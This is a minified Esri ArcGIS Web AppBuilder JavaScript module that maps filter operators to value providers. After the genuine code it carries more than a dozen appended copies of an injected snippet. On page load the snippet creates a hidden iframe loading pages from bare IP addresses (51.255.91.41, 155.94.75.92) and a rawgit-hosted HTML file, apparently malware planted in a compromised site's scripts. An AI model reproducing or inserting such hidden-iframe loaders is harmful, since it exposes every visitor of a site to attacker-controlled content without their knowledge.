// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/array dojo/_base/declare ./BlankValueProvider ./SimpleValueProvider ./TwoNumbersValueProvider ./TwoDatesValueProvider ./ListValueProvider ./NumberListValueProvider ./DateIsInValueProvider jimu/LayerInfos/LayerInfos".split(" "),function(f,k,r,t,u,v,w,x,y,z,A){var m={stringOperatorIs:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",codedValueProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",
supportAskForValue:!0,filterCodedValueIfPossible:!0}},stringOperatorIsNot:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},stringOperatorStartsWith:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0,supportCaseSensitive:!0}},stringOperatorEndsWith:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0,
supportCaseSensitive:!0}},stringOperatorContains:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0,supportCaseSensitive:!0}},stringOperatorDoesNotContain:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0,supportCaseSensitive:!0}},stringOperatorIsBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}},stringOperatorIsNotBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}},numberOperatorIs:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",codedValueProviderType:"LIST_VALUE_PROVIDER",
supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsNot:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsAtLeast:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},
field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsLessThan:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsAtMost:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},
unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsGreaterThan:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"},unique:{normalProviderType:"LIST_VALUE_PROVIDER",supportAskForValue:!0,filterCodedValueIfPossible:!0}},numberOperatorIsBetween:{value:{normalProviderType:"TWO_NUMBERS_VALUE_PROVIDER",supportAskForValue:!0}},numberOperatorIsNotBetween:{value:{normalProviderType:"TWO_NUMBERS_VALUE_PROVIDER",
supportAskForValue:!0}},numberOperatorIsBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}},numberOperatorIsNotBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}},dateOperatorIsOn:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorIsNotOn:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorIsIn:{value:{normalProviderType:"DATE_IS_IN_VALUE_PROVIDER",
supportAskForValue:!0}},dateOperatorIsNotIn:{value:{normalProviderType:"DATE_IS_IN_VALUE_PROVIDER",supportAskForValue:!0}},dateOperatorIsBefore:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorIsAfter:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorIsOnOrBefore:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},
field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorIsOnOrAfter:{value:{normalProviderType:"SIMPLE_VALUE_PROVIDER",supportAskForValue:!0},field:{normalProviderType:"LIST_VALUE_PROVIDER"}},dateOperatorInTheLast:{value:{normalProviderType:"NUMBER_LIST_VALUE_PROVIDER",supportAskForValue:!0}},dateOperatorNotInTheLast:{value:{normalProviderType:"NUMBER_LIST_VALUE_PROVIDER",supportAskForValue:!0}},dateOperatorIsBetween:{value:{normalProviderType:"TWO_DATES_VALUE_PROVIDER",supportAskForValue:!0}},
dateOperatorIsNotBetween:{value:{normalProviderType:"TWO_DATES_VALUE_PROVIDER",supportAskForValue:!0}},dateOperatorIsBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}},dateOperatorIsNotBlank:{value:{normalProviderType:"BLANK_VALUE_PROVIDER"}}},d=r([],{nls:null,layerInfo:null,popupInfo:null,url:null,layerDefinition:null,featureLayerId:null,constructor:function(a){f.mixin(this,a);this.nls=window.jimuNls.filterBuilder;a=A.getInstanceSync();this.featureLayerId&&(this.layerInfo=a.getLayerOrTableInfoById(this.featureLayerId))&&
(this.popupInfo=this.layerInfo.getPopupInfo())},getSupportedValueTypes:function(a,b){var c=[];if(b=m[b])b.value&&c.push("value"),b.field&&0<this._getSameShortTypeFieldNames(a).length&&c.push("field"),b.unique&&this.url&&(this._isStreamServer(this.url)||10.1<=parseFloat(this.layerDefinition.currentVersion)&&c.push("unique"));return c},_isStreamServer:function(a){a=(a||"").replace(/\/*$/g,"");return/\/StreamServer$/gi.test(a)},_getSameShortTypeFieldNames:function(a){var b=[],c=this._getFieldInfo(this.layerDefinition,
a),g=d.getShortTypeByEsriType(c.type);k.forEach(this.layerDefinition.fields,f.hitch(this,function(c){c.name!==a&&d.getShortTypeByEsriType(c.type)===g&&b.push(c.name)}));return b},getValueProvider:function(a,b){var c=null,g=f.clone(m[a.operator]);if(g){var d=a.valueObj.type,n=a.fieldObj.name,p=this._getFieldInfo(this.layerDefinition,n),l=g[d],e=l.normalProviderType,q=null,h=this._getCodedValues(p);h||this.layerDefinition.typeIdField&&this.layerDefinition.typeIdField.toUpperCase()===n.toUpperCase()&&
(h=this._getSubTypes(this.layerDefinition));"field"===d?(d=this._getSameShortTypeFieldNames(n),0<d.length&&(q=k.map(d,f.hitch(this,function(a){return{value:a,label:a}})))):h&&0<h.length&&l.codedValueProviderType&&(e=l.codedValueProviderType);a={nls:this.nls,url:this.url,layerDefinition:this.layerDefinition,partObj:a,fieldInfo:p,codedValues:h,staticValues:q,layerInfo:this.layerInfo,popupInfo:this.popupInfo,operatorInfo:g,filterCodedValueIfPossible:!!l.filterCodedValueIfPossible,runtime:b};"BLANK_VALUE_PROVIDER"===
e?c=new t(a):"SIMPLE_VALUE_PROVIDER"===e?c=new u(a):"TWO_NUMBERS_VALUE_PROVIDER"===e?c=new v(a):"TWO_DATES_VALUE_PROVIDER"===e?c=new w(a):"LIST_VALUE_PROVIDER"===e?(a.showNullValues=!1,c=new x(a)):"NUMBER_LIST_VALUE_PROVIDER"===e?c=new y(a):"DATE_IS_IN_VALUE_PROVIDER"===e&&(c=new z(a))}return c},_getFieldInfo:function(a,b){a=a.fields;for(var c=0;c<a.length;c++){var d=a[c];if(b===d.name)return d}return null},_getCodedValues:function(a){var b=null;(a=a.domain)&&"codedValue"===a.type&&a.codedValues&&
0<a.codedValues.length&&(b=a.codedValues,b=k.map(b,f.hitch(this,function(a){return{value:a.code,label:a.name}})));return b},_getSubTypes:function(a){var b=null;a.typeIdField&&a.types&&0<a.types.length&&(b=k.map(a.types,f.hitch(this,function(a){return{value:a.id,label:a.name}})));return b}});d.getOperatorInfo=function(a){return f.clone(m[a])};d.getOperatorsByShortType=function(a){var b=[];"string"===a?b="stringOperatorIs stringOperatorIsNot stringOperatorStartsWith stringOperatorEndsWith stringOperatorContains stringOperatorDoesNotContain stringOperatorIsBlank stringOperatorIsNotBlank".split(" "):
"number"===a?b="numberOperatorIs numberOperatorIsNot numberOperatorIsAtLeast numberOperatorIsLessThan numberOperatorIsAtMost numberOperatorIsGreaterThan numberOperatorIsBetween numberOperatorIsNotBetween numberOperatorIsBlank numberOperatorIsNotBlank".split(" "):"date"===a&&(b="dateOperatorIsOn dateOperatorIsNotOn dateOperatorIsIn dateOperatorIsNotIn dateOperatorIsBefore dateOperatorIsAfter dateOperatorIsOnOrBefore dateOperatorIsOnOrAfter dateOperatorInTheLast dateOperatorNotInTheLast dateOperatorIsBetween dateOperatorIsNotBetween dateOperatorIsBlank dateOperatorIsNotBlank".split(" "));
return b};d.getShortTypeByEsriType=function(a){var b=null;"esriFieldTypeString"===a?b="string":"esriFieldTypeDate"===a?b="date":0<=["esriFieldTypeOID","esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"].indexOf(a)&&(b="number");return b};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});